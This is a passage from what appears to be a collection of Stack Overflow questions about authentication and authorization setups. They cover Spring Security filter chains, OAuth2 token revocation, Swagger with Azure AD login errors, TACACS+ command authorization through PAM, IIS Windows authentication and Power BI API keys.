                at org.springframework.beans.factory.support.AbstractBeanFactory.getMergedLocalBeanDefinition(AbstractBeanFactory.java:1358)
                at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:309)
                at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:213)
                at org.springframework.context.support.AbstractApplicationContext.getBean(AbstractApplicationContext.java:1162)
                at org.springframework.web.filter.DelegatingFilterProxy.initDelegate(DelegatingFilterProxy.java:334)
                at org.springframework.web.filter.DelegatingFilterProxy.initFilterBean(DelegatingFilterProxy.java:239)
                at org.springframework.web.filter.GenericFilterBean.init(GenericFilterBean.java:239)
                at org.apache.catalina.core.ApplicationFilterConfig.initFilter(ApplicationFilterConfig.java:262)
                at org.apache.catalina.core.ApplicationFilterConfig.&lt;init&gt;(ApplicationFilterConfig.java:101)

</code></pre>
<p>I am unable to determine why the security doesn't get registered when I put the config in the spring servlet context, but does get registered when it is in the root application context.</p>
<p><strong>Configuration:</strong></p>
<p>SecurityApplicationInitializer.java:</p>
<pre><code>public class SecurityApplicationInitializer extends AbstractSecurityWebApplicationInitializer
{

    @Override
    protected boolean enableHttpSessionEventPublisher()
    {
        // Publishes HttpSessionApplicationEvents to the Spring Root WebApplicationContext
        return true;
    }

    @Override
    protected void beforeSpringSecurityFilterChain( ServletContext servletContext )
    {
        // TODO: move into SecurityConfiguration?
        SecurityContextHolder.setStrategyName( SecurityContextHolder.MODE_INHERITABLETHREADLOCAL );

        MultipartFilter multipartFilter = new MultipartFilter();
        multipartFilter.setMultipartResolverBeanName( &quot;multipartResolver&quot; );

        OriginInterceptor originInterceptor = new OriginInterceptor();

        insertFilters( servletContext, multipartFilter, originInterceptor );
    }
}

</code></pre>
<p>MainWebApplicationInitializer.java:</p>
<pre><code>public class MainWebApplicationInitializer extends AbstractAnnotationConfigDispatcherServletInitializer
{

    @Override
    public void onStartup( ServletContext servletContext ) throws ServletException
    {
        super.onStartup( servletContext );

        servletContext.addListener( new IIOProviderContextListener() );
        // TODO: Is it possible to have spring create this and have it register itself?
        servletContext.addListener( new ConfigureSessionTimeoutListener() );
    }

    @Override
    protected Class&lt;?&gt;[] getRootConfigClasses()
    {
        return new Class&lt;?&gt;[] { SecurityServicesConfiguration.class,  MainConfiguration.class };
    }

    @Override
    protected Class&lt;?&gt;[] getServletConfigClasses()
    {
        return new Class&lt;?&gt;[] { WebSecurityConfiguration.class, WebMvcConfiguration.class };
    }

    @Override
    protected String[] getServletMappings()
    {
        return new String[] { &quot;/&quot; };
    }

    @Override
    protected Filter[] getServletFilters()
    {
        CharacterEncodingFilter characterEncodingFilter = new CharacterEncodingFilter();
        characterEncodingFilter.setEncoding( &quot;UTF-8&quot; );
        characterEncodingFilter.setForceEncoding( true );

        return new Filter[] { characterEncodingFilter };
    }
}

</code></pre>
<p>WebSecurityConfiguration.java:</p>
<pre><code>@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class WebSecurityConfiguration
{

    @Bean
    public AuthenticationManager authenticationManager( DaoAuthenticationProvider daoAuthenticationProvider )
    {
        return new ProviderManager( daoAuthenticationProvider );
    }

    @Bean
    public DaoAuthenticationProvider daoAuthenticationProvider( UserDetailsService internalUserDetailsService,
                                                                PasswordEncoder passwordEncoder )
    {
        DaoAuthenticationProvider daoAuthenticationProvider = new DaoAuthenticationProvider();
        daoAuthenticationProvider.setUserDetailsService( internalUserDetailsService );
        daoAuthenticationProvider.setPasswordEncoder( passwordEncoder );
        return daoAuthenticationProvider;
    }

    @Bean
    public CookieCsrfTokenRepository cookieCsrfTokenRepository()
    {
        CookieCsrfTokenRepository cookieCsrfTokenRepository = new CookieCsrfTokenRepository();
        cookieCsrfTokenRepository.setCookieHttpOnly( false );
        return cookieCsrfTokenRepository;
    }

    @Bean
    public SecurityFilterChain newApiSecurityFilterChain( HttpSecurity http,
                                                          SessionRegistry sessionRegistry ) throws Exception
    {
        return http
            .securityMatchers( securityMatchers -&gt; securityMatchers
                .requestMatchers( &quot;/api/**&quot; )
            )
            .csrf( csrf -&gt; csrf
                .csrfTokenRepository( cookieCsrfTokenRepository() )
            )
            .httpBasic( httpBasic -&gt; httpBasic
                .authenticationEntryPoint( new ApiAuthenticationEntryPoint() )
            )
            .sessionManagement( sessionManagement -&gt; sessionManagement
                .maximumSessions( -1 )
                .sessionRegistry( sessionRegistry )
            )
            .build();
    }

}

</code></pre>
<p>Note: If I manually add a <code>HandlerMappingIntrospector</code> in the <code>WebSecurityConfiguration</code> when used in the RootConfigClasses then it loads, but I don't think this is the correct solution, and the config should load without this and when put in the ServletConfigClasses.</p>
<pre><code>    @Bean( name = &quot;mvcHandlerMappingIntrospector&quot; )
    public HandlerMappingIntrospector mvcHandlerMappingIntrospector()
    {
        return new HandlerMappingIntrospector();
    }
</code></pre>
"
"<p>I am working on microservice based e-commerce project, in which there are two resources user-service and ecom-service. I have secured user-service with Spring Security JWT token based authentication and also implemented my gateway using Spring gateway and applied Eureka as discovery client, but I am facing problem when my ecom-service makes feign request to user-service its forbidden as I mentioned its Spring secured. I want to know how can I reuse my JWT token to make feign call and how to put token in feign request?</p>
<p>I want to know how can I make feign request to Spring secured microservice</p>
"
"<p>I implemented a custom revocation authentication provider and added it to the <code>OAuth2AuthorizationServerConfigurer</code>, and it works fine. then we decided to add the revoke token endpoint to the <code>permitAll()</code> endpoints and remove the security check because we want to use it without sending clientId and clientSecret, then when I am throwing an exception from the custom revocation authentication provider, the default one get excuted and then the authentication check in the default one throws <code>OAuth2AuthenticationException(OAuth2ErrorCodes.INVALID_CLIENT)</code>.
Even if I throw OAuth2AuthenticationException(OAuth2ErrorCodes.INVALID_TOKEN) from my custom revocation authentication provider.</p>
<p>This is my code:</p>
<pre><code> authorizationServerConfigurer.tokenRevocationEndpoint(tokenRevocationEndpoint -&gt; tokenRevocationEndpoint.authenticationProvider(new RevocationAuthenticationProvider(revokedTokenRepository)));
</code></pre>
<pre><code>public class RevocationAuthenticationProvider implements AuthenticationProvider {

@Override
    public Authentication authenticate(Authentication authentication) throws AuthenticationException {
        OAuth2TokenRevocationAuthenticationToken tokenRevocationAuthentication =
                (OAuth2TokenRevocationAuthenticationToken) authentication;

        JWTClaimsSet claims;
        try {
            claims = getTokenClaims(tokenRevocationAuthentication);
            if (isCustomValidationCheck(claims)) {
                throw new OAuth2AuthenticationException(OAuth2ErrorCodes.INVALID_TOKEN);
            }
// Custom implementation
}
}
</code></pre>
<p>if the <code>isCustomValidationCheck</code> method return true I am getting a response message &quot;invalid_client&quot; not invalid_token because the default logic is always checking for the <code>clientPrincipal</code> in the <code>OAuth2AuthenticationProviderUtils.getAuthenticatedClientElseThrowInvalidClient()</code></p>
"
"<p>I have followed roughly <a href=""https://www.scottbrady91.com/identity-server/aspnet-core-swagger-ui-authorization-using-identityserver4"" rel=""nofollow noreferrer"">Scott's blog</a> in combination with <a href=""https://www.josephguadagno.net/2022/06/03/enabling-user-authentication-in-swagger-using-microsoft-identity"" rel=""nofollow noreferrer"">Joseph's blog</a>. Unfortunately, I get the error <em>Auth ErrorTypeError: Failed to fetch</em>.</p>
<p>The config for authorization is like this (<code>{tenantId}</code> is a valid GUID).</p>
<pre><code>services.AddSwaggerGen(options =&gt;
{
  options.AddSecurityRequirement(new() { ... });
  options.AddSecurityDefinition(&quot;oauth2&quot;, new()
  {
    Type = SecuritySchemeType.OAuth2,
    Flows = new()
    {
      AuthorizationCode = new()
      {
        AuthorizationUrl = new(&quot;https://login.microsoftonline.com/{tenantId}/oauth2/v2.0/authorize&quot;),
        TokenUrl = new(&quot;https://login.microsoftonline.com/{tenantId}/common/v2.0/token&quot;),
        Scopes = new Dictionary&lt;string, string&gt;
        {
          { &quot;https://graph.microsoft.com/.default&quot;, &quot;https://graph.microsoft.com/.default&quot; }            
        }
      }
    }
  });
});
</code></pre>
<p>Then, I also have the config for the UI like so ({clientId} is a valid GUID).</p>
<pre><code>app.UseSwaggerUI(options =&gt;
{
  options.OAuthAppName(&quot;Beep&quot;);
  options.OAuthClientId(&quot;{clientId}&quot;);
  options.OAuthClientSecret(&quot;HakunaMatata&quot;);
  options.OAuthScopes([&quot;https://graph.microsoft.com/.default&quot; ]);
  options.OAuthUsePkce();
});
</code></pre>
<p>The authorization button in Swagger opens the popup and when requesting the call, the error above is returned. I don't understand where the problem occurs nor how I can troubleshoot it further. The only thing I noticed was that not providing any scopes, leads to an error message in Azure. Providing a scope won't even show the sign-in page there. I've verified that the .<a href=""https://login.microsoftonline.com/a2728528-eff8-409c-a379-7d900c45d9ba/v2.0/.well-known/openid-configuration"" rel=""nofollow noreferrer"">well-known</a> produces correct values for authorization and token endpoints. I verified that the secret is correct for the app registration as well as the Redirect URI pointing to my Swagger (https://localhost:7001/swagger/oauth2-redirect.html). Most of the related questions deal with implicit flow or API key, which isn't applicable in my case. Similar questions regarding the error message are <a href=""https://stackoverflow.com/questions/55339189/typeerror-failed-to-fetch-in-swagger"">rather</a> <a href=""https://stackoverflow.com/questions/44285007/swagger-typeerror-failed-to-fetch"">not</a> <a href=""https://stackoverflow.com/questions/56568703/swaggertypeerror-failed-to-fetch"">rewarding</a>. I also tried to declare a dedicated scope (api://d53180a4-0a79-4f7a-96aa-3f2eed32f559/SwaggerScope) and using it shows me the login page but picking a user produced the same error message.</p>
<p>I inspected the network calls and noticed something unexpected. Apparently, CORS is triggered on the token endpoint <strong>and</strong> it also reports 404 Not Found (which is self-contradictory but I imagine the not-find-ness is somehow caused by the CORS-ness). The URL <strong>is not</strong> what I specify in my config above (according to the <a href=""https://login.microsoftonline.com/a2728528-eff8-409c-a379-7d900c45d9ba/v2.0/.well-known/openid-configuration"" rel=""nofollow noreferrer"">.well-known</a> endpoint) and I don't control the server to activate the allowed origins.</p>
<p><a href=""https://i.stack.imgur.com/vS2QX.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/vS2QX.png"" alt=""enter image description here"" /></a>
What can I investigate or try out?</p>
"
"<p>I have established a TACACS+ server and a PAM TACACS client using the resources available at
<a href=""https://github.com/kravietz/pam_tacplus/tree/main"" rel=""nofollow noreferrer"">text</a>
I am using TACACS+ to authenticate Linux users using pam_tacplus.so</p>
<p>Upon user SSH access to the TACACS client machine(ubuntu 18.04), my objective is to authenticate users through the TACACS+ server and permit the execution of only those commands in the shell that are sanctioned within the TACACS+ server configuration.</p>
<p>Although authentication is functioning correctly, I am encountering challenges in enabling shell command authorization.</p>
<p>This is the tacacs+ server config in /etc/tacacs+/tac_plus.conf</p>
<pre><code>group = admingroup {
    default service = permit
    service = exec {
            priv-lvl = 12
    }
}
user = test {
    member = admingroup
    global = cleartext &quot;12345&quot;
}
user = test_user {
    global = cleartext &quot;12345&quot;
cmd = ls {
            permit .*
    }
}
</code></pre>
<p>I have also created a local user on the client machine with the same username as in the server config.</p>
<p>In the PAM sshd module present in /etc/pam.d I have added:</p>
<pre><code>auth sufficient /lib/security/pam_tacplus.so debug server=192.168.95.161 secret=test_123 service=system protocol=tcp
account sufficient /lib/security/pam_tacplus.so debug server=192.168.95.161 secret=test_123 service=system protocol=tcp acct_all
session sufficient /lib/security/pam_tacplus.so debug server=192.168.95.161 secret=test_123 service=system protocol=tcp
</code></pre>
<p>In the tacacs+ config, I have allowed test_user can execute only &quot;ls&quot; command, but all commands can be executed. The client doesn't seem to authorize permitted commands from the server.</p>
<p>What modifications or adjustments are necessary to address this issue and achieve the desired functionality, and can we do accounting for this command in this case?</p>
"
"<p>I am trying call an API(written in C#) from Excel VBA. The Request message is formed within the Excel VBA and send to the API. The message looks like as follows:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;IncomingMessage xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
               xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;
   &lt;MessageSource&gt;hello&lt;/MessageSource&gt;
   &lt;MessagefromID&gt;Newuser&lt;/MessagefromID&gt;
   &lt;MessageVersion&gt;20240221&lt;/MessageVersion&gt;
   &lt;MessageType&gt;1&lt;/MessageType&gt;
   &lt;Command&gt;Select Count(1) AS count from TableName&lt;/Command&gt;
   &lt;MessageParams/&gt;
   &lt;MessageTimeStamp&gt;2024-03-08T14:03:10.00&lt;/MessageTimeStamp&gt;
&lt;/IncomingMessage&gt;
</code></pre>
<p>Also some message header are set:</p>
<pre><code>httpObject.setRequestHeader &quot;Content-type&quot;, &quot;application/xml&quot;
    httpObject.setRequestHeader &quot;Content-Length&quot;, Len(MessageVariable)
</code></pre>
<p>When I try to call the API from the excel macro I get the error -</p>
<pre><code>401 - Unauthorized: Access is denied due to invalid credentials
</code></pre>
<p>I would like to have Windows Authentication enabled. Meaning only AD users of the Domain can access the API.</p>
<p>The IIS Authentication setting for the Application Pool is as follows:</p>
<pre><code>Anonymous Auth - Disabled
Basic Auth - Disabled
Windows Auth - Enabled

</code></pre>
<p>The IIS Authorization setting for the Application Pool is as follows:</p>
<pre><code>Deny - Anonymous User
Allow - All Users

</code></pre>
<p>The Identity of the Application pool is &quot;ApplicationPoolIdentity&quot;.</p>
<p>Can you please advise, if I should send something extra in the request header to make it work? Or some other IIS settings that must be updated.</p>
<p>Note: I have tried to update the Identity of the Application Pool to &quot;Local System&quot; , but to no use.</p>
<p>Many thanks in advance for any help.</p>
"
"<p>I'm developing a security-related Spring Boot starter library to be consumed by other applications. The library comes with starter-like autoconfiguration that executes by default once the library is added as a dependency in the target application(s). What it does is it sets up a <code>filter</code> to run before an HTTP request is processed in order to perform some authorization checks.</p>
<p>What I want to do is write an integration test <strong>within</strong> the library that &quot;simulates&quot; the behaviour as when the library logic would run in a target application. That is, send an HTTP request to some endpoint, and test that the authorization checked worked (or didn't). My autoconfiguration looks like this:</p>
<p><strong>SecTestAutoconfiguration.kt</strong></p>
<pre class=""lang-kotlin prettyprint-override""><code>@AutoConfiguration
@EnableMethodSecurity
@ConditionalOnProperty(
  name = [&quot;security.enabled&quot;],
  havingValue = &quot;true&quot;,
  matchIfMissing = true
)
open class SecTestAutoconfiguration {
   // multiple @Bean definitions that don't matter
}
</code></pre>
<p>Now in my tests, since there is no main class in the library, I am creating one under <code>src/test/kotlin/..</code>. like so:</p>
<p><strong>TestApplication.kt</strong></p>
<pre class=""lang-kotlin prettyprint-override""><code>@SpringBootApplication
open class TestApplication
</code></pre>
<p>Then my IT test looks like this:</p>
<p><strong>AppIT.kt</strong></p>
<pre class=""lang-kotlin prettyprint-override""><code>@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@AutoConfigureWebTestClient(timeout = &quot;20000&quot;)
class SecurityIT {

  @Autowired
  private lateinit var webTestClient: WebTestClient

  @Test
  fun test() {
    webTestClient.get()
      .uri(&quot;/test&quot;)
      .header(HttpHeaders.AUTHORIZATION, &quot;some-token&quot;)
      .exchange()
      .expectStatus()
      .isOk()
  }
}
</code></pre>
<p>and finally my test controller looks like this:</p>
<p><strong>TestController.kt</strong></p>
<pre class=""lang-kotlin prettyprint-override""><code>@RestController
open class TestController(
) {
  @Autowired private lateinit var applicationContext: ApplicationContext

  @GetMapping(&quot;/test&quot;)
  @PreAuthorize(&quot;hasRole('SOME_ROLE')&quot;) // This is problematic
  fun test() {
    println(applicationContext.id)
  }
}
</code></pre>
<p>The problem is that whatever I inject in my <code>TestController</code> seems to be <code>null</code>. This seems to be caused by <code>@PreAuthorize</code> since when I remove it, the <code>applicationContext</code> bean (or others defined in the auto-config) are getting properly initialized. Also tried with other spring-security annotations like <code>@Secured</code> or <code>@RolesAllowed</code> but getting the same outcome, <code>null</code> beans. Any ideas?</p>
"
"<p>Why does this work</p>
<pre class=""lang-java prettyprint-override""><code>    @Bean
    public ReactiveUserDetailsService userDetailsService() {
        return username -&gt; {
            Mono&lt;UserDetails&gt; userDetailsMono = Mono.justOrEmpty(userRepository.findByUsername(username));
            return userDetailsMono.switchIfEmpty(Mono.error(() -&gt; new UsernameNotFoundException(&quot;No such user: &quot; + username)));
        };
    }
</code></pre>
<p>but this doesn't (which I would prefer as a more concise option)?</p>
<pre class=""lang-java prettyprint-override""><code>    @Bean
    public ReactiveUserDetailsService userDetailsService() {
        return username -&gt; Mono.justOrEmpty(userRepository.findByUsername(username))
                .switchIfEmpty(Mono.error(() -&gt; new UsernameNotFoundException(&quot;No such user: &quot; + username)));
    }
</code></pre>
<pre class=""lang-none prettyprint-override""><code>Bad return type in lambda expression: Mono&lt;User&gt; cannot be converted to Mono&lt;UserDetails&gt;
</code></pre>
<p><code>User</code> is my custom user class that implements <code>UserDetails</code>. <code>findByUsername()</code> returns <code>Mono&lt;User&gt;</code></p>
<pre class=""lang-java prettyprint-override""><code>// @Entity etc.
public class User implements UserDetails {
</code></pre>
<pre class=""lang-java prettyprint-override""><code>public interface UserRepository extends Repository&lt;User, UUID&gt; {
//...
    Optional&lt;User&gt; findByUsername(String username);
</code></pre>
"
"<p>I have a <strong>working</strong> setup with Swagger (roughly setup like in <a href=""https://stackoverflow.com/a/66376443/1525840"">this answer</a>) sending me over to Azure where I authorize and then obtain a functioning token. Everything is as supposed to and it's not about <a href=""https://stackoverflow.com/questions/76438571/azure-api-aadsts9002326-cross-origin-token-redemption-is-permitted-only-for-t"">changing from Web to SPA</a>.</p>
<p>A colleague suggested that we should serve Swaggy directly in the root of the backend instead of the path <em>/swagger</em>, so I introduced the following changes in the code (accompanied with an extra redirect URL in Azure (</p>
<pre><code>//app.UseSwagger(options =&gt; options.RouteTemplate = &quot;swagger/{documentName}/docs.json&quot;);
app.UseSwagger(options =&gt; options.RouteTemplate = &quot;swaggy/{documentName}/docs.json&quot;);
app.UseSwaggerUI(options =&gt;
{
  ...
  //options.RoutePrefix = &quot;swagger&quot;;
  options.RoutePrefix = &quot;swaggy&quot;;
});
</code></pre>
<blockquote>
<p>https://localhost:7001/swagger/oauth2-redirect.html<br />
https://localhost:7001/swaggy/oauth2-redirect.html</p>
</blockquote>
<p>This still works and I see no issues altering the swagger location. However, once I drop it entirely and serve it from the root (as agreed with the team) and make the change as shown below, it stops working!</p>
<pre><code>//app.UseSwagger(options =&gt; options.RouteTemplate = &quot;swagger/{documentName}/docs.json&quot;);
app.UseSwagger(options =&gt; options.RouteTemplate = &quot;{documentName}/docs.json&quot;);
app.UseSwaggerUI(options =&gt;
{
  ...
  //options.RoutePrefix = &quot;swagger&quot;;
  options.RoutePrefix = &quot;&quot;;
});
</code></pre>
<blockquote>
<p>https://localhost:7001/swagger/oauth2-redirect.html<br />
https://localhost:7001/oauth2-redirect.html</p>
</blockquote>
<p>I'm suddenly faced with the following error message.</p>
<blockquote>
<p>Auth ErrorError: response status is 400, error: invalid_request, description: AADSTS9002326: Cross-origin token redemption is permitted only for the 'Single-Page Application' client-type. Request origin: 'https://localhost:7001'.</p>
</blockquote>
<p>I've been googling it the whole day and see nothing about it. All the hits refer to changing the platform to Azure to SPA and/or checking the redirect URLs. None of that is relevant here.</p>
<p>What is it about and how can I kill it?</p>
"
"<p>I am upgrading my Grails 3 app to Grails 5 and during start up i see the following logs</p>
<pre><code>2024-02-23 11:08:29.189  INFO 70553 --- [           main] o.s.boot.web.servlet.RegistrationBean    : Filter securityRequestHolderFilter was not registered (disabled)
2024-02-23 11:08:30.008  INFO 70553 --- [           main] o.s.boot.web.servlet.RegistrationBean    : Filter securityContextPersistenceFilter was not registered (disabled)
2024-02-23 11:08:30.465  INFO 70553 --- [           main] o.s.boot.web.servlet.RegistrationBean    : Filter mutableLogoutFilter was not registered (disabled)
2024-02-23 11:08:31.069  INFO 70553 --- [           main] o.s.boot.web.servlet.RegistrationBean    : Filter casAuthenticationFilter was not registered (disabled)
2024-02-23 11:08:31.268  INFO 70553 --- [           main] o.s.boot.web.servlet.RegistrationBean    : Filter grailsUsernamePasswordAuthenticationFilter was not registered (disabled)
2024-02-23 11:08:31.577  INFO 70553 --- [           main] o.s.boot.web.servlet.RegistrationBean    : Filter restAuthenticationFilter was not registered (disabled)
2024-02-23 11:08:32.693  INFO 70553 --- [           main] o.s.boot.web.servlet.RegistrationBean    : Filter securityContextHolderAwareRequestFilter was not registered (disabled)
2024-02-23 11:08:33.077  INFO 70553 --- [           main] o.s.boot.web.servlet.RegistrationBean    : Filter grailsRememberMeAuthenticationFilter was not registered (disabled)
2024-02-23 11:08:38.325  INFO 70553 --- [           main] o.s.boot.web.servlet.RegistrationBean    : Filter grailsAnonymousAuthenticationFilter was not registered (disabled)
2024-02-23 11:08:40.264  INFO 70553 --- [           main] o.s.boot.web.servlet.RegistrationBean    : Filter restTokenValidationFilter was not registered (disabled)
2024-02-23 11:12:44.021  INFO 70553 --- [           main] o.s.boot.web.servlet.RegistrationBean    : Filter formContentFilter was not registered (disabled)
2024-02-23 11:12:44.023  INFO 70553 --- [           main] o.s.boot.web.servlet.RegistrationBean    : Filter exceptionTranslationFilter was not registered (disabled)
2024-02-23 11:12:44.029  INFO 70553 --- [           main] o.s.boot.web.servlet.RegistrationBean    : Filter updateRequestContextHolderExceptionTranslationFilter was not registered (disabled)
2024-02-23 11:12:44.029  INFO 70553 --- [           main] o.s.boot.web.servlet.RegistrationBean    : Filter filterSecurityInterceptor was not registered (disabled)
2024-02-23 11:12:44.029  INFO 70553 --- [           main] o.s.boot.web.servlet.RegistrationBean    : Filter switchUserFilter was not registered (disabled)
</code></pre>
"
"<p>I'm trying to use Oauth2 authentication on an endpoint (&quot;/auth&quot;) and at the same time to set a filter on all the other endpoints to check for a cookie and validate it.</p>
<p>I have done a custom filter for that purpose and here is what I've done in the filter chain:</p>
<pre><code>@Configuration
@EnableWebSecurity(debug = true)
public class SecurityConfiguration {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
           http.authorizeRequests()
               .antMatchers(&quot;/auth&quot;).authenticated()
               .and()   
               .oauth2Login()
               .and()
               .regexMatcher(&quot;^(?!\\/auth).*&quot;)
               .addFilterAt(new CookieAuthFilter(), OAuth2LoginAuthenticationFilter.class);
           
        return http.build();
    }
}
</code></pre>
<p>The filter works, but the oauth not.
If I remove the lines:</p>
<pre><code>.and()
.regexMatcher(&quot;^(?!\\/auth).*&quot;)
.addFilterAt(new CookieAuthFilter(), OAuth2LoginAuthenticationFilter.class)
</code></pre>
<p>oauth works again, so I think the problem is releated to a misconfiguration of the filter chain.</p>
<p>When using the addFilter and requesting &quot;/auth&quot; endpoint i see in Spring Security logs this:
<code>Security filter chain: no match</code></p>
<p>What am I doing wrong?</p>
<p>Thanks.</p>
"
"<p>When i post a request with the accurate body type, it was showing 403 forbidden error.</p>
<pre><code>package com.WebAuthentication.DemoProject.security.config;

import com.WebAuthentication.DemoProject.appuser.AppUserService;
import lombok.AllArgsConstructor;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.authentication.dao.DaoAuthenticationProvider;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configurers.AbstractAuthenticationFilterConfigurer;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.web.SecurityFilterChain;

@Configuration
@AllArgsConstructor
@EnableWebSecurity
public class WebSecurityConfig {

    private final AppUserService appUserService;
    private final BCryptPasswordEncoder bCryptPasswordEncoder;
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
                .authorizeHttpRequests((auth) -&gt; auth
                        .requestMatchers(&quot;/api/v*/**&quot;).permitAll()
                );
        return http.build();
    }

    @Bean
    public DaoAuthenticationProvider daoAuthenticationProvider(){
        DaoAuthenticationProvider provider = new DaoAuthenticationProvider();
        provider.setPasswordEncoder(bCryptPasswordEncoder);
        provider.setUserDetailsService(appUserService);
        return provider;
    }

}

</code></pre>
<p>###RegistrationController</p>
<pre><code>package com.WebAuthentication.DemoProject.registration;

import lombok.AllArgsConstructor;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping(path = &quot;api/v1/registration&quot;)
@AllArgsConstructor
public class RegistrationController {

    private final RegistrationService registrationService;
    @PostMapping
    public String register(@RequestBody RegistrationRequest request){

        return &quot;It works&quot;;
    }

}

</code></pre>
<p>The build was successfull and the console shows no error.
The Response must be It works.</p>
<pre><code>package com.WebAuthentication.DemoProject.appuser;

import lombok.AllArgsConstructor;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.stereotype.Service;

@Service
@AllArgsConstructor
public class AppUserService implements UserDetailsService {

    private final static String USER_NOT_FOUND_MESSAGE = &quot;User with email %s not found&quot;;
    private final AppUserRepository appUserRepository;
    @Override
    public UserDetails loadUserByUsername(String email)
            throws UsernameNotFoundException {

        return appUserRepository.findByEmail(email)
                .orElseThrow(()-&gt;
                    new UsernameNotFoundException(String.format(USER_NOT_FOUND_MESSAGE,email)));

    }
}

</code></pre>
<p>The build was successfull and the console shows no error.
The Response must be It works.
Help me out.</p>
<p>I tried this  but not worked</p>
<pre><code>@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .authorizeRequests((auth) -&gt; auth
            .antMatchers(&quot;/api/v*/registration/**&quot;).permitAll() // Allow unrestricted access to these endpoints
            .anyRequest().authenticated() // Require authentication for any other request
        );

    return http.build();
}

</code></pre>
"
"<p>Im trying to call an API from power bi desktop using the web connector. I have the url which includes a query. I also have a Key which i will be using for connecting from power bi to that api.</p>
<p>I tried the below options:</p>
<ol>
<li><p>Use Web connector --&gt; Advanced --&gt; In the headers, creates &quot;Authorization&quot; and provided the key, it failed with the error &quot;A web API key can only be specified when a web API key name is provided&quot;</p>
</li>
<li><p>M Query --&gt; Web.Contents(&quot;https://api.xyz.com/page-metrics/get&quot;,[ApiKeyName=&quot;x_api_key&quot;]), and passed the Key in the &quot;Key&quot; prompt using WEB API credential.</p>
</li>
<li><p>Use Web connector --&gt; Advanced --&gt; In the headers, create &quot;ApiKeyName&quot; and provided the key.</p>
</li>
</ol>
<p>None of the above worked, while all the forums that i read through provided almost similar answers.</p>
<p>Am I doing something wrong here? or is there a different way of doing this? Appreciate if someone can throw some light. TIA.</p>
<p>My URL(test) looks like this : <strong><a href=""https://api.testing.com/v3/external/reporting/sharing?endDate=2019-03-12&amp;startDate=2019-03-02&amp;metric=blend_sharing%67"" rel=""nofollow noreferrer"">https://api.testing.com/v3/external/reporting/sharing?endDate=2019-03-12&amp;startDate=2019-03-02&amp;metric=blend_sharing%67</a></strong></p>
"
"<p>We have a requirement in which for a certain rest call, we need to intercept the request before getting it to the controller and add something to the request body. I am able to do that using an authorization filter. The problem is, when I read the request using stream reader, it somehow adds an extra slash to '\t' (tab). That makes it '\t'. When the request gets to controller, due to this extra slash, it is treated as text instead of 'tab'.</p>
<p><strong>Request Body</strong></p>
<pre><code>{
&quot;myData&quot;: &quot;This is some text \t more text&quot;
}
</code></pre>
<p><strong>Controller</strong></p>
<pre><code>[MyRequestConverter]
[HttpPost]
public virtual IActionResult myServiceAction([FromBody]myRequestModel myRequest)
{  
   // suppose print is something that writes the data to a file
   print(myRequest.myData);
}
</code></pre>
<p><strong>Authorization Filter</strong></p>
<pre><code>public class MyRequestConverter : Attribute, IAsyncAuthorizationFilter
 {

     public MyRequestConverter() { }

     private async Task&lt;string&gt; GetRequestBodyAsTextAsync(HttpRequest request)
     {    
        
             var reqbody = &quot;&quot;;
             request.EnableBuffering();
             request.Body.Seek(0, SeekOrigin.Begin);

             using (var reader = new StreamReader(request.Body, Encoding.UTF8, true, 1024, true))
             {
                 reqbody = await @reader.ReadToEndAsync();
             }
             request.Body.Position = 0;

             return reqbody;

     }


     public async Task OnAuthorizationAsync(AuthorizationFilterContext filterContext)
     {
                var stream = request.Body;// currently holds the original stream                    

                var originalContent = await GetRequestBodyAsTextAsync(request);

                originalContent = AddSomethingToRequestBody(originalContent);

               var requestContent = new StringContent(originalContent, Encoding.UTF8, &quot;application/json&quot;);
               stream = await requestContent.ReadAsStreamAsync();

                var requestData = Encoding.UTF8.GetBytes(originalContent);
                stream = new MemoryStream(requestData);

                filterContext.HttpContext.Request.Body = stream;

       }



 }
</code></pre>
<p>With 'MyRequestConverter', it prints (it treats \t as text due to that extra slash)</p>
<p>This is some text \t more text</p>
<p>Without 'MyRequestConverter', it prints (desired output - it has tab spacing)</p>
<p>This is some text (tab) more text</p>
<p>I did some search and looks like one option is to replace '\\t' with '\t' but is there any other solution to this problem ?</p>
"
"<p><strong>Spring Boot version: 3.2.2</strong></p>
<pre><code>&lt;dependency&gt;
   &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
   &lt;artifactId&gt;spring-boot-starter-oauth2-client&lt;/artifactId&gt;
&lt;/dependency&gt;

&lt;dependency&gt;
   &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
   &lt;artifactId&gt;spring-boot-starter-oauth2-resource-server&lt;/artifactId&gt;
&lt;/dependency&gt;
</code></pre>
<p>What exactly is the difference between these two dependencies? I don't fully understand which one I should use in which situation. In my project, I perform Token transactions with Keycloak. Even though I used AuthenticationManagerResolver when my previous Spring Boot version was 2.7.4, I needed to define the following parameters. When I upgrade to version 3.2.2, I can verify tokens using Keycloak, even though I do not use these parameters:</p>
<pre><code>spring.security.oauth2.client.registration.keycloak.provider=keycloak
